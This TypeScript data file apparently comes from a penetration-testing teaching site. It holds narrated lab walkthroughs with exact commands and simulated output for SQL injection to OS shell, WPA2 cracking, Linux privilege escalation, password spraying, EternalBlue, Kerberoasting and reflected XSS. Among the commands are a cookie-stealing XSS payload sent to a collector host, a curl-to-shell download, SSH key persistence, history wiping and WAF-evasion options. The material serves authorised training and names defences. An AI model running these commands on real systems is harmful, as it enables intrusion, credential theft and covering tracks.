// ============================================================
// Play-by-play walkthroughs
// ------------------------------------------------------------
// Each walkthrough is a narrated, step-by-step "dry run" of an
// authorized security test. Unlike playbook `steps` (which are
// terse checklists), these walkthroughs are meant to teach:
//   - what you are about to see on the terminal
//   - the exact command you would run in a lab
//   - a realistic, LAB-ONLY expected output
//   - what to look for and how to decide the next move
//   - the branches to take when something goes wrong
//
// Everything below assumes an authorised lab (Hack The Box,
// TryHackMe, PortSwigger Web Security Academy, your own VM,
// or a client engagement with written scope). See /ethics.
// ============================================================

export type WalkthroughStep = {
  /** Short imperative title. */
  title: string;
  /** Longer narrated explanation of what and why. */
  narration: string;
  /** The command as you would type it. */
  command?: string;
  /** Realistic, redacted, LAB-ONLY expected output. */
  expectedOutput?: string;
  /** What to look for in the output — the "read" of the situation. */
  observation?: string;
  /** Common branches / failure modes and how to react. */
  branches?: { when: string; then: string }[];
  /** Optional cross-references to Kali tool slugs. */
  toolSlugs?: string[];
};

export type Walkthrough = {
  /** Matches a Playbook.slug when possible. */
  slug: string;
  /** Human title. */
  title: string;
  /** One-paragraph pitch of the scenario. */
  scenario: string;
  /** Lab environment we're pretending to be in. */
  labSetup: string;
  /** Realistic time budget for a first-time run in the lab. */
  duration: string;
  /** Skill level target. */
  difficulty: "beginner" | "intermediate" | "advanced";
  /** Legal preamble specific to this walkthrough. */
  legalNote: string;
  /** Ordered steps. */
  steps: WalkthroughStep[];
  /** What "success" looks like in the lab. */
  successCriteria: string;
  /** How a defender would notice this in production. */
  detectionSummary: string;
  /** How a defender should stop it in production. */
  mitigationSummary: string;
};

const LAB_NOTE =
  "Perform ONLY in an authorised lab or engagement. Outputs shown are simulated for teaching.";

// ---------------------------------------------------------------
// Walkthroughs
// ---------------------------------------------------------------

export const WALKTHROUGHS: Walkthrough[] = [
  // ============================================================
  {
    slug: "sqli-sqlmap",
    title: "SQL injection with sqlmap (end-to-end)",
    scenario:
      "You have found a suspicious query parameter on a lab web app. You'll confirm the injection, enumerate the DBMS, dump a specific table, and gain a shell.",
    labSetup: "DVWA / PortSwigger Academy / a HTB retired box with a MySQL back-end.",
    duration: "30–45 minutes",
    difficulty: "beginner",
    legalNote: LAB_NOTE,
    toolSlugs: ["sqlmap", "burpsuite-community"],
    steps: [
      {
        title: "Capture an authenticated request in Burp",
        narration:
          "sqlmap works best when it can replay a real, authenticated request. Log in through the browser with Burp's proxy on, then right-click the target request in Burp's HTTP history and 'Copy to file' as request.txt.",
        command: "# save the raw request as ./request.txt",
        observation:
          "You now have a file that includes cookies, headers, and the vulnerable parameter so sqlmap replays exactly what the browser sent.",
      },
      {
        title: "Detect the injection",
        narration:
          "Ask sqlmap to test the parameter conservatively. --batch accepts sqlmap's default answers so you can watch the flow without prompts.",
        command: "sqlmap -r request.txt --batch --level=2 --risk=1",
        expectedOutput:
          "[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'\n[INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable\nsqlmap identified the following injection point(s):\nParameter: id (GET)\n    Type: boolean-based blind\n    Type: time-based blind",
        observation:
          "Two techniques confirmed. Even 'boolean-based blind' is enough — you don't need error-based to proceed.",
        branches: [
          {
            when: "sqlmap says 'all tested parameters do not appear to be injectable'",
            then: "Bump --level to 3 and --risk to 2, add --technique=BEUSTQ, and confirm the request still has a valid session cookie.",
          },
          {
            when: "WAF blocks the requests (403 / captcha)",
            then: "Try --tamper=between,space2comment and slow down with --delay=1 --randomize=User-Agent.",
          },
        ],
      },
      {
        title: "Enumerate databases",
        narration: "Once injection is confirmed, list the databases.",
        command: "sqlmap -r request.txt --batch --dbs",
        expectedOutput:
          "available databases [4]:\n[*] information_schema\n[*] dvwa\n[*] mysql\n[*] performance_schema",
        observation: "'dvwa' is your target application DB.",
      },
      {
        title: "Enumerate tables and columns",
        narration: "Focus on the application database.",
        command: "sqlmap -r request.txt --batch -D dvwa --tables\nsqlmap -r request.txt --batch -D dvwa -T users --columns",
        expectedOutput:
          "Database: dvwa\n[2 tables]\n+-----------+\n| guestbook |\n| users     |\n+-----------+\n\nColumn types for users:\nuser, password, user_id, avatar",
        observation:
          "You have candidate creds columns. Never dump PII you don't strictly need — even in a lab, practise minimum-necessary.",
      },
      {
        title: "Dump credentials",
        narration:
          "Now dump only the columns you need. sqlmap will auto-recognise common hash types and offer to crack them with its built-in wordlist.",
        command: "sqlmap -r request.txt --batch -D dvwa -T users -C user,password --dump",
        expectedOutput:
          "Database: dvwa\nTable: users\n[5 entries]\n+---------+-------------------------------------------+\n| user    | password                                  |\n| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |\n| gordonb | e99a18c428cb38d5f260853678922e03 (abc123) |\n+---------+-------------------------------------------+",
        observation:
          "sqlmap flagged the hashes as MD5 and cracked several with its dictionary. Record only the credentials you need for the report; wipe local dumps at the end of the engagement.",
      },
      {
        title: "Escalate to OS command execution (only if in scope)",
        narration:
          "If the DBMS has FILE privileges and the write path is known, sqlmap can drop a stager. This is aggressive — only run if the RoE authorises RCE.",
        command: "sqlmap -r request.txt --batch --os-shell",
        expectedOutput:
          "[INFO] retrieved web server absolute paths:\n'/var/www/html/'\nos-shell> id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
        observation: "You have code execution as the web user. Stop; document, and cleanup any uploaded stagers.",
        branches: [
          {
            when: "The DB user lacks FILE privileges",
            then:
              "Stop escalation from this angle. Report the injection with the impact demonstrated by data access. Recommend parameterised queries.",
          },
        ],
      },
      {
        title: "Cleanup",
        narration:
          "Remove any --os-shell stager you uploaded (sqlmap prints the path), delete the ./output/ directory of dumps, and screenshot only what's needed for the report.",
        command: "rm -rf ~/.local/share/sqlmap/output/<target>",
      },
    ],
    successCriteria:
      "You have proven the injection, enumerated one table, dumped only the columns needed to prove impact, and (if in scope) demonstrated RCE — with all artefacts removed.",
    detectionSummary:
      "SQLi is loud: 100s of similar requests to one parameter, UNION SELECT / SLEEP / BENCHMARK patterns, and a spike in DB errors. WAF + DB audit logs catch it easily.",
    mitigationSummary:
      "Parameterised queries or an ORM everywhere; least-privilege DB user (no FILE, no xp_cmdshell); WAF as defence in depth; log and alert on DB error spikes.",
  },

  // ============================================================
  {
    slug: "wpa2-handshake",
    title: "Capturing and cracking a WPA2 handshake",
    scenario:
      "You are auditing your own home Wi-Fi. You'll put a NIC into monitor mode, capture the 4-way handshake with a targeted deauth, and crack it offline.",
    labSetup: "Your own AP, an external NIC that supports monitor mode (e.g. Alfa AWUS036ACH).",
    duration: "45–90 minutes (mostly waiting for cracking)",
    difficulty: "intermediate",
    legalNote:
      "Only ever run against a Wi-Fi network you own or have written permission to test. Deauth affects every client on that BSSID.",
    toolSlugs: ["aircrack-ng", "hashcat", "hcxdumptool"],
    steps: [
      {
        title: "Verify the NIC and enter monitor mode",
        narration:
          "Kill processes that grab the radio (NetworkManager, wpa_supplicant), then switch the interface into monitor mode.",
        command: "sudo airmon-ng check kill\nsudo airmon-ng start wlan0",
        expectedOutput:
          "PHY  Interface  Driver     Chipset\nphy0 wlan0     rt2800usb  Ralink ...\n(monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)",
        branches: [
          {
            when: "airmon-ng start reports 'monitor mode NOT enabled'",
            then:
              "iw dev wlan0 set type monitor after ip link set wlan0 down, then ip link set wlan0 up. Some chipsets need firmware from linux-firmware.",
          },
        ],
      },
      {
        title: "Discover the target AP",
        narration:
          "Scan the airwaves for a few seconds and note the BSSID and channel of your own AP.",
        command: "sudo airodump-ng wlan0mon",
        expectedOutput:
          "BSSID              PWR  CH  ENC  ESSID\nAA:BB:CC:11:22:33  -42  6   WPA2 MyLabAP",
        observation: "Take BSSID=AA:BB:CC:11:22:33 CH=6 forward.",
      },
      {
        title: "Focus capture on that BSSID/channel",
        narration:
          "Lock airodump-ng on channel 6 and write pcaps to disk. Leave this running in a second terminal.",
        command:
          "sudo airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w handshake wlan0mon",
        expectedOutput:
          "CH  6 ][ Elapsed: 12 s ][ 2025-01-01 ...\nBSSID              STATION            PWR   Frames\nAA:BB:CC:11:22:33  DE:AD:BE:EF:00:01  -55   42",
        observation:
          "You see one associated STATION. That's your deauth target. Watch the top-right of airodump for '[ WPA handshake: AA:BB:...' — that's the win condition.",
      },
      {
        title: "Force a handshake with a targeted deauth",
        narration:
          "Send a couple of deauth frames to your own client so it re-associates and completes the 4-way handshake.",
        command:
          "sudo aireplay-ng -0 2 -a AA:BB:CC:11:22:33 -c DE:AD:BE:EF:00:01 wlan0mon",
        expectedOutput:
          "Sending 64 directed DeAuth. STMAC: [DE:AD:BE:EF:00:01] [ 8|61 ACKs]",
        branches: [
          {
            when: "No handshake appears after several attempts",
            then:
              "Move closer / increase antenna gain, or wait for a client to naturally connect. On PMKID-capable APs use hcxdumptool for clientless capture.",
          },
        ],
      },
      {
        title: "Convert the capture to hashcat format",
        narration:
          "airodump-ng writes .cap; hashcat wants .hc22000. hcxpcapngtool does the conversion.",
        command: "hcxpcapngtool -o handshake.hc22000 handshake-01.cap",
        expectedOutput:
          "summary:\nfile name.................: handshake-01.cap\nEAPOL messages (total)....: 6\nEAPOL pairs written to combi hash: 1",
      },
      {
        title: "Crack with hashcat",
        narration:
          "Mode 22000 = WPA-PBKDF2-PMKID+EAPOL. Use rockyou or a targeted wordlist.",
        command: "hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt",
        expectedOutput:
          "Session..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)\nRecovered........: 1/1 (100.00%) Digests\ncandidate: password123",
        branches: [
          {
            when: "hashcat exhausts the wordlist without cracking",
            then:
              "Apply rules (--rules-file=rules/best64.rule) or move to a larger set (SecLists Rockyou-75, hashesorg). If still nothing, the password is strong — report that as a good finding.",
          },
        ],
      },
      {
        title: "Restore the NIC and cleanup",
        narration: "Return the interface to managed mode and restart NetworkManager.",
        command:
          "sudo airmon-ng stop wlan0mon\nsudo systemctl start NetworkManager\nshred -u handshake-01.cap handshake.hc22000",
      },
    ],
    successCriteria:
      "You captured the 4-way handshake against your own AP, cracked (or failed to crack) the PSK, then cleaned up all captured material.",
    detectionSummary:
      "WIDS sensors detect deauth storms and rogue monitor-mode NICs. Enterprise gear logs excessive re-associations.",
    mitigationSummary:
      "Use WPA3-SAE (immune to offline handshake cracking), enable PMF (802.11w) to block deauth spoofing, and choose passphrases of ≥16 random characters.",
  },

  // ============================================================
  {
    slug: "linux-privesc",
    title: "Linux privilege escalation — a systematic first hour",
    scenario:
      "You just landed a low-priv shell on a lab box. You'll enumerate, spot the misconfiguration, and escalate to root — cleanly and reproducibly.",
    labSetup: "TryHackMe 'Linux PrivEsc' room or HTB retired easy box.",
    duration: "30–60 minutes",
    difficulty: "beginner",
    legalNote: LAB_NOTE,
    toolSlugs: ["linpeas", "linux-exploit-suggester", "pspy"],
    steps: [
      {
        title: "Stabilise the shell",
        narration:
          "A dumb shell breaks half the tools. Upgrade to a PTY before enumerating.",
        command:
          "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\nCtrl+Z; stty raw -echo; fg; reset",
      },
      {
        title: "Quick manual triage",
        narration: "Before running loud enumeration, check the obvious wins.",
        command: "id\nuname -a\nsudo -l\ncat /etc/crontab\nfind / -perm -4000 -type f 2>/dev/null | head",
        expectedOutput:
          "uid=1001(dev) gid=1001(dev) groups=1001(dev),4(adm)\nLinux target 5.4.0-42 #46 x86_64 GNU/Linux\nUser dev may run the following:\n    (root) NOPASSWD: /usr/bin/find\n/usr/bin/find\n/usr/bin/passwd\n/usr/bin/sudo",
        observation:
          "You have (root) NOPASSWD on /usr/bin/find — that's a GTFOBins one-liner. Escalation is a single command away.",
      },
      {
        title: "Exploit sudo NOPASSWD on find",
        narration:
          "find has a -exec primitive that spawns arbitrary commands with the caller's privileges. Since sudo grants root, so does the exec.",
        command: "sudo find . -exec /bin/bash -p \\; -quit",
        expectedOutput: "# id\nuid=0(root) gid=0(root) groups=0(root)",
        branches: [
          {
            when: "sudo -l reveals nothing useful",
            then:
              "Deploy linpeas: `curl -fsSL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh > /tmp/l.txt`. Then read only the red/yellow hits.",
          },
          {
            when: "There's a writable cron script",
            then:
              "Watch /var/spool/cron and /etc/cron.* — inject a payload into a script that root executes. Use `pspy64` to see cron activity without root.",
          },
        ],
      },
      {
        title: "Persist for post-ex — only if in scope",
        narration:
          "Persistence is often OUT of scope. If the ROE allows it, drop an authorized_keys entry rather than a backdoor account; it is reversible and clearly authorized.",
        command:
          "mkdir -p /root/.ssh\necho 'ssh-ed25519 AAAA... auditor@lab' >> /root/.ssh/authorized_keys",
      },
      {
        title: "Cleanup",
        narration: "Remove any tool you dropped, revert changes, and write down the exact commands used.",
        command: "rm /tmp/linpeas.sh /tmp/l.txt\nhistory -c",
      },
    ],
    successCriteria:
      "You went from unprivileged to root via a specific, documented misconfiguration, and left the box the way you found it (minus one report).",
    detectionSummary:
      "auditd rules on execve of setuid binaries, sudo logs to syslog, and Falco/osquery rules catch most of this in production.",
    mitigationSummary:
      "Never grant NOPASSWD on binaries with a shell-out primitive (find, awk, vim, less…). Prefer scoped sudoers rules and remove unnecessary SUID bits.",
  },

  // ============================================================
  {
    slug: "port-scanning",
    title: "Nmap: from ping sweep to service enumeration",
    scenario:
      "You've just been given a /24 in scope. You'll live-host sweep, port scan the winners, and version+script scan the interesting ones — without waking every IDS on the network.",
    labSetup: "A lab /24 like 10.10.10.0/24 (HTB) or your own vulnhub range.",
    duration: "20–40 minutes",
    difficulty: "beginner",
    legalNote: LAB_NOTE,
    toolSlugs: ["nmap", "masscan", "naabu"],
    steps: [
      {
        title: "Live host sweep",
        narration:
          "Ping + ARP is the fastest way to find live hosts on a LAN. -sn skips port scanning.",
        command: "sudo nmap -sn -n --min-rate 500 10.10.10.0/24 -oA sweep",
        expectedOutput:
          "Nmap scan report for 10.10.10.5\nHost is up (0.0021s latency).\nMAC Address: 00:0C:29:...\nNmap scan report for 10.10.10.12\nHost is up (0.0018s latency).",
        observation: "Two live hosts. Extract them for the next stage.",
      },
      {
        title: "Extract live hosts to a file",
        narration: "Any 'Up' host in the .gnmap file gets grabbed with awk.",
        command:
          "awk '/Up$/{print $2}' sweep.gnmap > live.txt\ncat live.txt",
        expectedOutput: "10.10.10.5\n10.10.10.12",
      },
      {
        title: "Fast full-port TCP scan",
        narration:
          "Blast all 65535 TCP ports at a modest rate so we don't miss anything unusual, then feed the open ones to a slower version scan.",
        command:
          "sudo nmap -p- --min-rate 2000 -iL live.txt -oA fast",
        expectedOutput:
          "Nmap scan report for 10.10.10.5\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n8443/tcp  open  https-alt",
        branches: [
          {
            when: "Scan is slow or the IDS trips",
            then:
              "Drop --min-rate, add -T2, and randomise: --randomize-hosts + --data-length 24. Or split with masscan first then feed nmap.",
          },
        ],
      },
      {
        title: "Deep service + script scan on discovered ports",
        narration:
          "-sV enables version detection; -sC runs the default scripts (a good middle ground before category scripts).",
        command:
          "sudo nmap -sV -sC -p 22,80,8443 10.10.10.5 -oA deep",
        expectedOutput:
          "22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp   open  http    nginx 1.18.0\n|_http-title: Welcome to nginx\n8443/tcp open  ssl/https\n| ssl-cert: Subject: CN=lab.local\n| Not valid before: 2024-01-01",
        observation: "SSH is on a modern version; the web on 8443 uses a self-signed cert — probably an admin panel. That's your next enumeration target.",
      },
      {
        title: "Targeted NSE for vulns",
        narration:
          "Run the `vuln` and `vulners` categories only on services that matter. Don't blast --script=all on production.",
        command:
          "sudo nmap --script vuln,vulners -p 80,8443 10.10.10.5 -oA vulns",
      },
    ],
    successCriteria:
      "You have three artefact files (sweep, fast, deep) plus a `live.txt`, ready to feed into your next phase (web fuzzing, credential attacks, etc.).",
    detectionSummary:
      "IDS/IPS (Suricata, Snort) fingerprint nmap by its default probe pattern. --min-rate and -sC are especially loud.",
    mitigationSummary:
      "Segment networks so scans can't cross zones, rate-limit at firewalls, and treat unexplained SYNs to closed ports as a strong signal.",
  },

  // ============================================================
  {
    slug: "ssh-brute",
    title: "Password spraying SSH (authorised)",
    scenario:
      "You're in an assumed-breach scenario against a lab tenant with two known usernames. You'll perform a SLOW, low-signal spray with hydra — never a fast brute force.",
    labSetup: "Your own SSH VM or HTB lab with weak creds allowed.",
    duration: "10–20 minutes",
    difficulty: "beginner",
    legalNote:
      "Password spraying is destructive against production accounts (lockouts). Only run in an authorised lab or with explicit written scope, ideally after coordinating with IR.",
    toolSlugs: ["hydra", "medusa", "crackmapexec"],
    steps: [
      {
        title: "Build a minimal userlist and short candidate list",
        narration:
          "A spray uses ONE password against MANY users. Use a small, contextual list (Season + year etc.) rather than rockyou to avoid lockouts.",
        command:
          "printf 'alice\\nbob\\n' > users.txt\nprintf 'Autumn2025!\\nWelcome1\\n' > pw.txt",
      },
      {
        title: "Run hydra slowly with jitter",
        narration:
          "-t 1 keeps it serial. -W 5 waits 5s between attempts. -f stops on first success. This is polite, and mimics a real spray.",
        command:
          "hydra -L users.txt -P pw.txt -t 1 -W 5 -f ssh://10.10.10.5 -o spray.log",
        expectedOutput:
          "[22][ssh] host: 10.10.10.5   login: bob   password: Welcome1\n1 of 1 target successfully completed",
        branches: [
          {
            when: "Every attempt returns 'Connection refused' after a few tries",
            then:
              "fail2ban is banning your IP. Slow down further, rotate through a proxy pool if authorised, or ask the sysadmin to whitelist you.",
          },
          {
            when: "You need to test against a bastion/2FA host",
            then:
              "Stop. You can't spray past a properly configured 2FA. Document it as a good finding.",
          },
        ],
      },
      {
        title: "Log in and confirm scope",
        narration:
          "Prove the credential works, note the timestamp, then log out. Do not run recon under the hijacked account unless the ROE says so.",
        command: "ssh bob@10.10.10.5\nid; exit",
      },
    ],
    successCriteria:
      "One credential pair proven, one .log file for the report, no lockouts triggered.",
    detectionSummary:
      "Login failures across many usernames from a single source IP are the canonical spray signal. SIEM correlation on 4625 (Windows) or auth.log (Linux) catches it.",
    mitigationSummary:
      "Enforce MFA on all admin surfaces, disable password auth on SSH (keys only), rate-limit with fail2ban/pam_tally2, and alert on N failures across ≥5 users in <1h.",
  },

  // ============================================================
  {
    slug: "hashcat-workflow",
    title: "A disciplined hashcat cracking session",
    scenario:
      "You've been handed a dump of unknown hashes from a breach exercise. You'll identify the algorithm, choose the right mode, run a smart attack sequence, and stop when marginal returns plateau.",
    labSetup: "Any host with a GPU or CPU-only hashcat. Sample hashes on hashcat.net/wiki/doku.php?id=example_hashes.",
    duration: "30–120 minutes",
    difficulty: "intermediate",
    legalNote: LAB_NOTE,
    toolSlugs: ["hashcat", "hashid", "john-jumbo"],
    steps: [
      {
        title: "Identify the hash type",
        narration:
          "Don't guess. hashid + a manual eye on length and prefix works. NTLM = 32 hex chars, sha512crypt = $6$…, bcrypt = $2b$…",
        command: "hashid -m 'e10adc3949ba59abbe56e057f20f883e'",
        expectedOutput:
          "[+] MD5 [Hashcat Mode: 0]\n[+] NTLM [Hashcat Mode: 1000]",
      },
      {
        title: "Sanity-check with a benchmark",
        narration:
          "Confirm your box can chew through the mode. If your rig gets 3 MH/s on -m 1000, spraying rockyou takes seconds.",
        command: "hashcat -b -m 1000",
      },
      {
        title: "Attack #1 — straight wordlist",
        narration: "Always start with rockyou (or a corpus-specific list).",
        command:
          "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --status",
        expectedOutput:
          "Recovered........: 34/128 (26.56%) Digests",
      },
      {
        title: "Attack #2 — rules on the leftover",
        narration:
          "hashcat replays your list with mutations. best64 is a great first pass; d3ad0ne and OneRuleToRuleThemAll for later.",
        command:
          "hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule --loopback",
        expectedOutput: "Recovered........: 71/128 (55.47%) Digests",
      },
      {
        title: "Attack #3 — targeted mask for the tail",
        narration:
          "The remaining hashes are probably 'strong'. Try a mask that matches the target's password policy (e.g. one upper, six lower, two digits, one symbol).",
        command:
          "hashcat -m 1000 -a 3 hashes.txt '?u?l?l?l?l?l?l?d?d?s'",
        branches: [
          {
            when: "Runtime for the mask is >48h",
            then:
              "Shorten with a hybrid attack (-a 6 wordlist + ?d?d?s). Do NOT run cost-prohibitive masks in engagement time.",
          },
        ],
      },
      {
        title: "Report and destroy",
        narration:
          "Export the cracked pairs, hand them to the client via a secure channel, then wipe.",
        command:
          "hashcat -m 1000 hashes.txt --show > cracked.txt\nshred -u cracked.txt hashcat.potfile",
      },
    ],
    successCriteria:
      "You have a documented crack rate, know which policy classes fell, and every intermediate file is wiped.",
    detectionSummary:
      "Offline cracking is invisible to the target. What matters is knowing whether the hashes came from a real leak — investigate that separately.",
    mitigationSummary:
      "Move to bcrypt/argon2id at cost 10+, mandate 15+ char passphrases, and monitor for reuse via HIBP-style feeds.",
  },

  // ============================================================
  {
    slug: "xss-reflected",
    title: "Reflected XSS: from suspicion to a working PoC",
    scenario:
      "A search parameter reflects your input. You'll confirm reflection context, build a minimal PoC, and demonstrate cookie theft to a lab collector.",
    labSetup: "PortSwigger XSS labs or DVWA on 'low' security.",
    duration: "20 minutes",
    difficulty: "beginner",
    legalNote: LAB_NOTE,
    toolSlugs: ["burpsuite-community", "xsstrike"],
    steps: [
      {
        title: "Confirm reflection and identify context",
        narration:
          "Send a benign marker string; look at where it lands in the HTML — attribute, script block, or text?",
        command:
          "curl -s 'https://target.tld/search?q=zzMARKERzz' | grep -n MARKER",
        expectedOutput:
          "42: <input name=\"q\" value=\"zzMARKERzz\">",
        observation: "Reflected inside an attribute value — break out with a quote.",
      },
      {
        title: "Break out of the context",
        narration:
          "Try the minimum payload that would break the attribute and inject an event handler.",
        command:
          "curl -s 'https://target.tld/search?q=%22%3E%3Cimg+src+onerror%3Dalert(1)%3E' | grep -n onerror",
        expectedOutput: "42: <input name=\"q\" value=\"\"><img src onerror=alert(1)>\">",
      },
      {
        title: "Build the shareable PoC URL",
        narration:
          "Convert your working payload into a clickable link. Include a note that only lab / authorised testers should open it.",
        command:
          "echo 'https://target.tld/search?q=%22%3E%3Cscript%3Efetch(\"https://collector.lab/?c=\"+document.cookie)%3C%2Fscript%3E'",
      },
      {
        title: "Prove impact (lab only)",
        narration:
          "Spin up a plain nc listener that just logs incoming requests. Click the link in an incognito tab, then read the log.",
        command: "nc -lvnp 8000",
        expectedOutput:
          "GET /?c=PHPSESSID=abcdef123456 HTTP/1.1\nHost: collector.lab",
        branches: [
          {
            when: "Cookie has HttpOnly set",
            then:
              "Cookie theft won't work; demonstrate account takeover via a fetch() to the profile endpoint that changes the email, showing session-riding impact instead.",
          },
          {
            when: "CSP blocks the injected script",
            then:
              "Check CSP header — unsafe-inline? external allowed? try a <script src=…> from an allowed domain, or move to attribute-only payloads with onerror/onclick.",
          },
        ],
      },
    ],
    successCriteria:
      "One reproducible URL demonstrating impact (session theft or account action), a screenshot, and the fix recommendation ready.",
    detectionSummary:
      "WAFs flag common payloads (<script>, onerror). SIEMs correlating 400s from one IP to reflected params can catch fuzzing.",
    mitigationSummary:
      "Context-aware output encoding (HTML/attr/JS/URL), strict CSP with nonces, HttpOnly + SameSite cookies, and secure defaults in the templating engine.",
  },

  // ============================================================
  {
    slug: "smb-eternalblue",
    title: "EternalBlue (MS17-010) in a lab",
    scenario:
      "An unpatched Windows 7 lab host is exposed on 445. You'll verify vulnerability with the safe checker, exploit with Metasploit, and land a stable shell.",
    labSetup: "HTB 'Blue' or an intentionally-vuln Win7 VM.",
    duration: "20 minutes",
    difficulty: "beginner",
    legalNote:
      "EternalBlue can crash unpatched hosts. Only run in a lab where downtime is fine.",
    toolSlugs: ["metasploit", "nmap"],
    steps: [
      {
        title: "Pre-check with nmap NSE",
        narration:
          "Always run smb-vuln-ms17-010 before firing the exploit; it also fingerprints if the box will BSOD.",
        command:
          "nmap -p445 --script smb-vuln-ms17-010 10.10.10.40",
        expectedOutput:
          "Host script results:\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (MS17-010)",
      },
      {
        title: "Configure Metasploit",
        narration:
          "Use the eternalblue module; set RHOSTS, LHOST (your tun0), and use a staged reverse TCP.",
        command:
          "msfconsole -q\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.10.40\nset LHOST 10.10.14.2\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\ncheck",
        expectedOutput:
          "[+] 10.10.10.40:445 - The target is vulnerable.",
      },
      {
        title: "Run it",
        narration:
          "The exploit sprays the SMB kernel pool and can be finicky. Retry twice before assuming failure.",
        command: "run",
        expectedOutput:
          "[*] 10.10.10.40:445 - Sending SMBv1 buffer...\n[+] 10.10.10.40:445 - WIN\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM",
        branches: [
          {
            when: "Target BSODs",
            then:
              "Reboot the VM. Try the manual auxiliary/admin/smb/ms17_010_command flavour with a simpler payload.",
          },
        ],
      },
      {
        title: "Post-ex: migrate to a stable process",
        narration: "Get out of the fragile exploit process into a long-lived one.",
        command: "ps\nmigrate <lsass_or_spoolsv_pid>",
      },
      {
        title: "Cleanup",
        narration: "Revert the VM snapshot after documentation.",
        command: "# snapshot revert from the hypervisor",
      },
    ],
    successCriteria: "SYSTEM shell obtained, session migrated, snapshot reverted.",
    detectionSummary:
      "Zeek's smb.log and Suricata SIDs for MS17-010 flag it. A wave of SMB session setup + trans2 requests is very distinctive.",
    mitigationSummary:
      "Disable SMBv1 everywhere, apply MS17-010, and block 445 at the network edge. Segment legacy hosts.",
  },

  // ============================================================
  {
    slug: "kerberoast",
    title: "Kerberoasting an AD lab",
    scenario:
      "You have a low-priv AD user's creds. You'll request TGS tickets for service accounts and crack them offline.",
    labSetup: "GOAD / HTB AD labs / your own Windows Server DC + a couple of SPN'd service users.",
    duration: "20–40 minutes",
    difficulty: "intermediate",
    legalNote: LAB_NOTE,
    toolSlugs: ["impacket-suite", "hashcat", "bloodhound"],
    steps: [
      {
        title: "Confirm creds work",
        narration:
          "Prove you can auth to LDAP before doing anything else. crackmapexec is polite.",
        command: "crackmapexec ldap dc01.lab.local -u alice -p 'Autumn2025!' -k",
      },
      {
        title: "Enumerate SPNs (accounts with kerberoastable tickets)",
        narration:
          "Any user with a servicePrincipalName can have a TGS requested by anyone who is authenticated to the domain — that's the primitive.",
        command:
          "impacket-GetUserSPNs lab.local/alice:'Autumn2025!' -dc-ip 10.10.10.10",
        expectedOutput:
          "ServicePrincipalName             Name          MemberOf         PasswordLastSet\nMSSQLSvc/sql01.lab.local:1433    sqlsvc        Domain Users     2020-04-11 ...",
      },
      {
        title: "Request the tickets",
        narration:
          "-request writes tickets in $krb5tgs$23$*…* — hashcat mode 13100.",
        command:
          "impacket-GetUserSPNs lab.local/alice:'Autumn2025!' -dc-ip 10.10.10.10 -request -outputfile tgs.hash",
      },
      {
        title: "Crack offline",
        narration:
          "Service passwords are often set-and-forget from 2015. rockyou usually cracks them.",
        command:
          "hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r rules/best64.rule",
        expectedOutput:
          "sqlsvc:Summer2019!\n1 of 1 hashes cracked",
        branches: [
          {
            when: "No hits in rockyou",
            then:
              "Use a corp-flavoured wordlist (CompanyName + season + year), or move to AS-REP roasting on any pre-auth-disabled users.",
          },
        ],
      },
      {
        title: "Use the credential responsibly",
        narration:
          "Log in with the cracked service account only within scope, do NOT touch prod DBs, and shred artefacts.",
        command:
          "crackmapexec mssql sql01.lab.local -u sqlsvc -p 'Summer2019!'\nshred -u tgs.hash",
      },
    ],
    successCriteria:
      "At least one service account cracked, its impact demonstrated cleanly, artefacts wiped.",
    detectionSummary:
      "Event ID 4769 with an unusual encryption type (RC4 = 0x17) from a workstation is the classic signature. Sysmon + SIEM correlate quickly.",
    mitigationSummary:
      "Use gMSAs for service accounts (25-char random passwords, rotated automatically); enforce AES for Kerberos; audit SPNs on privileged accounts.",
  },

  // ============================================================
  {
    slug: "content-discovery",
    title: "Web content discovery with ffuf",
    scenario:
      "You have one URL and need to enumerate the hidden attack surface: files, endpoints, and vhosts — without hammering the target.",
    labSetup: "Any lab web app (DVWA, juice-shop, HTB machines).",
    duration: "15–30 minutes",
    difficulty: "beginner",
    legalNote: LAB_NOTE,
    toolSlugs: ["ffuf", "gobuster", "feroxbuster"],
    steps: [
      {
        title: "Fingerprint the baseline",
        narration:
          "Discovery works by comparing responses. Note the size/status of a 404 so you can filter it later.",
        command:
          "curl -s -o /dev/null -w '%{http_code} %{size_download}\\n' https://target.tld/definitely-not-there",
        expectedOutput: "404 132",
      },
      {
        title: "Directory brute-force with size filtering",
        narration:
          "-fs 132 filters out the fake-404 length so only real content shows up.",
        command:
          "ffuf -u https://target.tld/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fs 132 -mc all",
        expectedOutput:
          "admin                   [Status: 302, Size: 0]\napi                     [Status: 401, Size: 42]\nassets                  [Status: 301, Size: 178]",
      },
      {
        title: "Recurse into interesting hits",
        narration: "Only recurse where 200/301/302 promise more content. Otherwise it explodes.",
        command:
          "ffuf -u https://target.tld/admin/FUZZ -w raft-medium-directories.txt -recursion -recursion-depth 2 -mc all -fc 404",
      },
      {
        title: "VHost discovery on the same IP",
        narration:
          "Fuzz the Host header to find virtual hosts (common for old apps behind a shared IP).",
        command:
          "ffuf -u https://target.tld/ -H 'Host: FUZZ.target.tld' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 132",
      },
      {
